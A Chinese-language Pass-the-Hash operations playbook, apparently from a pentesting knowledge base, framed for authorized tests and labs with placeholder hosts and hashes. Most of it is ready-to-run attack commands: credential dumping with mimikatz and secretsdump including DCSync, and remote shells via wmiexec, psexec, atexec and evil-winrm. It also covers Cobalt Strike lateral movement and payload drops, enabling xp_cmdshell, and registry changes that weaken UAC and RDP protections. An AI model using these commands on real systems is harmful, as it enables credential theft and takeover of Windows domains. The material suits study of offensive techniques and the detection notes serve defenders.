# Pass-the-Hash 操作手册

> 配套原理：[哈希传递（Pass-the-Hash）](Pass-the-Hash.md)。本文给出一套可以按顺序落地执行的流程，所有 IP、域名、用户名和哈希均为占位符。仅限授权测试、靶场和比赛环境。
> 方法选型见：[各方法对比](Pass-the-Hash-各方法对比.md)　|　MSF 内操作见：[MSF 下的 PtH 操作](Pass-the-Hash-MSF操作.md)　|　纯命令版：[Pass-the-Hash-纯命令版](Pass-the-Hash-纯命令版.md)


## 0. 示例环境

```text
DOMAIN       corp.local
DC           10.10.10.10
TARGET       10.10.10.20
USER         Administrator
NTHASH       31d6cfe0d16ae931b73c59d7e0c089c0
```

本文中的命令统一使用以下变量，实际执行时替换即可：

Bash：

```bash
export DOMAIN="corp.local"
export TARGET="10.10.10.20"
export USER="Administrator"
export NTHASH="31d6cfe0d16ae931b73c59d7e0c089c0"
```

## 0.5 工具链：Kali 上三件套怎么配着用

Kali 自带三个能做 PtH 的工具，**不是二选一，是流水线**：

| 工具 | 定位 | 干什么 |
|---|---|---|
| **NetExec (nxc)** | 侦察兵 | 批量扫网段，看哪些机器能通 |
| **Impacket** | 突击手 | 精确打单台、快速验证、拿 shell |
| **Metasploit** | 后勤基地 | 需要稳定 session、后续成套后渗透 |

**推荐流程：**

```
nxc 探路（秒级摸清情况）
  → impacket 快速验证 + 拿 shell
  → 需要深入时上 MSF 拿 Meterpreter session
  → load kiwi / autoroute 做后续
```

别一上来就 `msfconsole`——启动慢，打不中要重来；而 `nxc` 三秒钟就告诉你这台通不通。

**只记一个的话：`impacket-wmiexec`。** 能通就说明认证 + 权限都没问题，再考虑要不要上 MSF。

两个版本差异：

- 新版 Kali 的命令是 `impacket-xxx`（带前缀），老版本只有 `xxx.py`——**同一个东西**
- `crackmapexec` / `cme` 已被 **NetExec (nxc)** 取代，新 Kali 上敲 `cme` 可能没有

缺失时安装：

```bash
sudo apt install python3-impacket
sudo apt install netexec
```

## 1. 先确认目标是否具备落地条件

### 1.1 检查端口

```bash
nmap -Pn -p 445,135,139,5985,5986,3389,1433 "$TARGET"
```

判断：

| 端口 | 对应利用方式 |
|---|---|
| 445 | SMB、WMI、PsExec、smbexec |
| 135 | WMI、DCOM、计划任务 |
| 5985 / 5986 | WinRM |
| 3389 | RDP，需要 Restricted Admin |
| 1433 | MSSQL |

### 1.2 确认目标是否允许 NTLM

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN"
```

结果判断：

```text
[+] CORP\Administrator:31d6...
```

表示认证成功，但未必有管理员权限。

```text
[+] CORP\Administrator:31d6... (Pwn3d!)
```

表示认证成功且具备远程执行权限。

```text
[-] STATUS_LOGON_FAILURE
```

通常是用户名、域、哈希或账户状态错误。

```text
[-] STATUS_ACCESS_DENIED
```

通常是认证成功但权限不足。

```text
[-] STATUS_NOT_SUPPORTED
```

目标可能禁用了 NTLM，或只允许 Kerberos。

## 2. 获取 NT Hash

### 2.1 Windows 本机抓取

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

重点字段：

```text
User Name : Administrator
Domain    : CORP
NTLM      : 31d6cfe0d16ae931b73c59d7e0c089c0
```

**为什么有时抓不到明文密码：** `lsass` 内存里存的是**当前登录用户**的凭据。SYSTEM 是系统账户、不是真实登录用户，所以在 SYSTEM 权限下执行 `sekurlsa::logonpasswords` 往往只能拿到哈希、拿不到明文。

需要明文时，先降权或注入一个 Administrator 权限的进程，再在其中执行抓取。

### 2.2 远程导出 SAM

已有管理员明文密码时：

```bash
impacket-secretsdump "$DOMAIN/$USER:password@$TARGET"
```

已有管理员哈希时：

```bash
impacket-secretsdump -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

只导出 SAM 中的本地哈希：

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 2.3 域内获取 DCSync

只有账户具备 `Replicating Directory Changes` 等权限时才能成功：

```bash
impacket-secretsdump -just-dc-user Administrator -hashes ":$NTHASH" "$DOMAIN/$USER@$DC"
```

Mimikatz：

```text
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

## 3. 区分域账户和本地账户

### 3.1 域账户

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN"
```

Impacket 格式：

```bash
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "whoami"
```

### 3.2 本地账户

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" --local-auth
```

Impacket 格式：

```bash
impacket-wmiexec -hashes ":$NTHASH" "$USER@$TARGET" "whoami"
```

注意：本地账户远程管理可能受到 UAC 远程限制影响。

具体规则：**自 Windows Vista 起，只有内置管理员账户（RID 500）默认可以远程 PtH**。其他本地管理员账户（包括自己新建的）会因为 UAC 远程限制而无法远程认证——即使哈希正确。

需要时在目标机上放行：

```text
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ^
  /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

> 判断当前账户是不是 RID 500：`hashdump` 输出里的第二个字段（RID），内置 Administrator 是 `500`。

## 4. SMB 落地流程

### 4.1 枚举共享

方式一：NetExec

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" --shares
```

方式二：Impacket

```bash
impacket-smbclient -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

进入交互界面后：

```text
shares
use C$
ls
get Users\Administrator\Desktop\flag.txt
```

### 4.2 读取远程文件

```bash
impacket-smbclient -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

```text
use C$
ls
get Windows\Temp\config.txt
```

如果需要非交互式读取，优先使用 `wmiexec` 执行 `type`、`copy` 等命令，或使用支持 `-hashes` 的 SMB 客户端。普通 `mount -t cifs` 不能直接使用 NT hash。

## 5. 执行单条命令

### 5.1 WMI：推荐的低噪声方式

```bash
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "whoami"
```

读取文件：

```bash
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "type C:\Users\Administrator\Desktop\flag.txt"
```

> ⚠️ **`wmiexec` 同样需要目标上的本地管理员权限**，不是"认证成功就能执行命令"。
> 原因有两个：远程进程创建（`Win32_Process.Create`）本身要求高权限；输出回显还要往 `ADMIN$` 写临时文件再读回来。
> 所以 `nxc` 显示 `[+]` 但没有 `Pwn3d!` 时，`wmiexec` 一样执行不了。

> 另外注意端口差异：`wmiexec` 需要 **135 + 一段动态 RPC 端口**，而 `psexec` 只要 445。
> 防火墙"只放 445"的环境里，会出现 **psexec 能通而 wmiexec 反而不通** 的情况——跟直觉相反。

### 5.2 NetExec SMB

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -x "whoami"
```

PowerShell 命令：

```bash
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -X "Get-Process | Select-Object -First 5"
```

### 5.3 ATExec：通过计划任务执行

```bash
impacket-atexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "whoami"
```

> ⚠️ **参数位置**：用 `-hashes` 时，要执行的命令必须放在 `@目标` **之后**。
> 写成 `impacket-atexec -hashes :$NTHASH "whoami" $DOMAIN/$USER@$TARGET` 会把命令当参数解析，静默失败。

### 5.4 SMBExec：通过服务执行

```bash
impacket-smbexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

## 6. 获取交互式 Shell

### 6.1 WMI Shell

```bash
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

### 6.2 PsExec Shell

```bash
impacket-psexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

PsExec 会创建服务并上传程序，日志痕迹明显，优先只在必要时使用。

### 6.3 WinRM Shell

```bash
nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -x "whoami"
```

```bash
evil-winrm -i "$TARGET" -u "$USER" -H "$NTHASH"
```

如果使用域账户：

```bash
evil-winrm -i "$TARGET" -u "$DOMAIN\$USER" -H "$NTHASH"
```

### 6.4 Cobalt Strike

在已有 beacon 里注入哈希，再用 `jump` 拿目标会话：

```text
beacon> pth <域>\<用户> <NTHASH>
beacon> shell dir \\<TARGET>\c$

beacon> jump psexec   <TARGET> <监听器名>
beacon> jump psexec_psh <TARGET> <监听器名>     # PowerShell 版，不落 exe
beacon> jump winrm64  <TARGET> <监听器名>       # 445 不通时走 5985
```

手工投放载荷（不依赖 `jump`）：

```text
beacon> shell copy artifact.exe \\<TARGET>\c$
beacon> shell sc \\<TARGET> create test binpath=C:\artifact.exe
beacon> shell sc \\<TARGET> start test
beacon> shell sc \\<TARGET> delete test
```

> Metasploit 内完成整条 PtH 流程的写法见 [MSF 下的 PtH 操作](Pass-the-Hash-MSF操作.md)。

## 7. MSSQL 横向

```bash
nxc mssql "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -q "SELECT @@version"
```

Impacket：

```bash
impacket-mssqlclient -windows-auth -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"
```

验证是否可执行系统命令：

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## 8. RDP 落地

目标必须允许 Restricted Admin：

```text
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

FreeRDP：

```bash
xfreerdp /v:"$TARGET" /u:"$USER" /d:"$DOMAIN" /pth:"$NTHASH" /restricted-admin /cert-ignore /dynamic-resolution
```

如果客户端或目标不支持 PtH，改用 Overpass-the-Hash 获取票据，或者使用已获得的明文密码。

## 9. Overpass-the-Hash 落地

适用于目标拒绝 NTLM，或者需要继续使用 Kerberos 的场景。

申请 TGT：

```bash
impacket-getTGT "$DOMAIN/$USER" -hashes ":$NTHASH"
```

设置票据缓存：

```bash
export KRB5CCNAME="$USER.ccache"
```

使用票据访问：

```bash
impacket-wmiexec -k -no-pass "$DOMAIN/$USER@$TARGET"
impacket-smbclient -k -no-pass "$DOMAIN/$USER@$TARGET"
```

检查票据：

```bash
klist
```

## 10. 完整落地示例

```bash
# 1. 确认 SMB 和 WinRM 是否开放
nmap -Pn -p 445,5985 "$TARGET"

# 2. 验证哈希
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN"

# 3. 枚举共享
nxc smb "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" --shares

# 4. 执行 whoami
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "whoami"

# 5. 获取交互 Shell
impacket-wmiexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET"

# 6. 如果 WMI 失败，尝试计划任务或 WinRM
impacket-atexec -hashes ":$NTHASH" "$DOMAIN/$USER@$TARGET" "whoami"
nxc winrm "$TARGET" -u "$USER" -H "$NTHASH" -d "$DOMAIN" -x "whoami"
```

## 11. 失败排查

| 现象 | 原因 | 处理 |
|---|---|---|
| `STATUS_LOGON_FAILURE` | 哈希、用户名、域或账户状态错误 | 检查 NT hash，确认域格式 |
| `STATUS_ACCESS_DENIED` | 认证成功但无远程管理权限 | 尝试其他账户或检查管理员组 |
| `STATUS_NOT_SUPPORTED` | NTLM 被禁用 | 改用 Overpass-the-Hash / Kerberos |
| `Connection refused` | 端口未开放 | 检查 445、135、5985、3389、1433 |
| `Connection timed out` | 防火墙或网络不通 | 建立隧道或检查路由 |
| `KDC_ERR_PREAUTH_FAILED` | Kerberos 哈希或账户不匹配 | 确认 AES/RC4 key，检查账户状态 |
| WMI 成功但 PsExec 失败 | 目标阻止服务创建或杀软拦截 | 使用 `wmiexec` 或 `atexec` |
| RDP 提示认证失败 | 未启用 Restricted Admin 或客户端不支持 | 开启 Restricted Admin 或改用票据 |

## 12. 操作后立即做的事

```text
1. 确认当前身份：whoami /all
2. 查目标主机名和域：hostname / systeminfo
3. 枚举共享：C$、ADMIN$、SYSVOL、NETLOGON
4. 搜索配置、脚本、备份和凭据
5. 判断是否有其他机器可以继续复用该哈希
6. 记录目标、账户、命令、时间和结果
```

## 13. 痕迹与清理

高风险痕迹：

```text
7045 服务安装
4688 进程创建
4624 登录类型 3
4776 NTLM 凭据验证
ADMIN$ 文件上传
PSEXESVC 服务
命名管道
```

清理原则：

- 授权测试结束后，按约定删除测试文件、服务、计划任务和新增账户。
- 不要在真实红队项目中随意删除日志或关键痕迹。
- 保留操作记录，便于复盘和客户确认。
- 在靶场中重点观察哪些动作会产生日志，而不是只关注是否拿到 Shell。

## 14. 最小可落地清单

```text
[ ] 确认拿到的是 NT hash
[ ] 确认目标开放 445 / 135 / 5985 / 3389 / 1433
[ ] 确认目标允许 NTLM
[ ] 用 nxc 验证哈希
[ ] 区分域账户和本地账户
[ ] 先执行 whoami
[ ] 优先 wmiexec，再尝试 atexec / smbexec / winrm
[ ] 失败时检查用户权限、UAC、Restricted Admin、NTLM 策略和防火墙
[ ] 成功后枚举共享、配置、脚本、备份和凭据
[ ] 记录命中的账户、目标、命令和日志痕迹
```
